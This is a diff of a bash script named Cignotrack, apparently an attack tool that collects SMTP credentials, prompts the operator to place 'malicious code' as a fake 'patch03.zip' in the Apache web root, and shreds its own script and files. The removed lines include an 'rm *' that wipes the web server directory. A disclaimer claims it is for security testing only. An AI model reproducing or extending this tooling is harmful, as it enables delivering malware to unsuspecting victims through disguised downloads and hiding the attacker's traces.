@@ -21,7 +21,7 @@ echo " "
 bar
 
 echo " "
-echo -e "\e[01;32mCignotrack is coded by Cignoraptor\e[00;31m just for security testing, the author decline any illegal use\e[00m"
+echo -e "\e[01;32mCignotrack is coded by Cignoraptor\e[00;31m just for security testing, the author decline any responsability for any illegal use\e[00m"
 echo " "
 echo -e "\e[00;33mEnter smtp username \e[00m(from: \e[00;34mhttps://app.smtp2go.com/settings/users\e[00m ): "
 		read smtpu
@@ -114,13 +114,8 @@ backd=$(cat dir.txt)
 echo -e "\e[01;33mInsert your malicious code in this directory ($backd) with name \e[00;31mpatch03.zip\e[00m"
 read
 
-cd /var/www/html
-echo -e "\e[00;33mAll files in your apache server will be erased, press ENTER: "
-read 
-rm *
-sleep 0.5
 cp * /var/www/html
-
+cd /var/www/html
 shred -u -z avviascam.sh
 shred -u -z dir.txt > /dev/null
 cd $backd
